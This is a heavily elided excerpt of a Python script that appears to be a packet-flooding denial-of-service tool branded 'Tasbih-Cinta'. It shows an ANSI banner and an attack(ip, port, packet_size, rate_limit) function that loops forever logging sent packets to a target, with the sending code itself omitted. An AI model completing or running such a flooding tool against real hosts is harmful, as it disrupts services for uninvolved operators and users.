...
\033[31m╔═══
\033[31m║\033[100m      \033[36m ██████╗\033[31m═══\033[33m██╗\033[31m══ \033[97m█████╗ \033[91m█████╗\033[31m═════\033[38;5;206m█╗\033[31m═══\033[38;5;206m█╗\033[31m═════════════════════╗\033[0m
...
def attack(ip: str, port: int, packet_size: int, rate_limit: float):
    ...
    try:
        while True:
            ...
            sent += 1
            log_message(f"\033[100m \033[34mTasbih-Cinta \033[0m \033[31m- {threading.get_ident()} \033[103m \033[97mSent{sent} \033[0m  \033[33m{ip}:{port}")
            log_message(f"\033[101m \033[97mTasbih-Cinta \033[0m \033[94m- {threading.get_ident()} \033[100m \033[31mSent{sent} \033[0m  \033[33m{ip}:{port}")
